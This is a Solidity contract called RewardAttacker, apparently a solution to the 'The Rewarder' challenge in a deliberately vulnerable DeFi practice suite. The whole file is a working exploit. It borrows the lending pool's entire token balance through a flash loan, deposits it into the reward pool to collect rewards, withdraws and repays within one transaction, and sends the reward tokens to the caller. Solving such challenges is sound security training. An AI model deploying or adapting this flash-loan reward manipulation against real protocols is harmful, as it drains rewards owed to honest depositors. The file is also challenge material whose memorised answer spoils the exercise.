// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {RewardToken} from "./RewardToken.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract RewardAttacker {
    DamnValuableToken liquidityToken;
    FlashLoanerPool loanPool;
    RewardToken rewardToken;
    TheRewarderPool rewardPool;

    constructor(address _rewardPool, address _rewardToken, address _loanPool, address _liquidityTokenAddress) {
        rewardPool = TheRewarderPool(_rewardPool);
        rewardToken = RewardToken(_rewardToken);
        loanPool = FlashLoanerPool(_loanPool);
        liquidityToken = DamnValuableToken(_liquidityTokenAddress);
    }

    function attack() public {
        loanPool.flashLoan(liquidityToken.balanceOf(address(loanPool)));
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256) external {
        uint256 bal = liquidityToken.balanceOf(address(this));

        liquidityToken.approve(address(rewardPool), bal);
        rewardPool.deposit(bal);
        rewardPool.withdraw(bal);

        liquidityToken.transfer(address(loanPool), bal);
    }
}
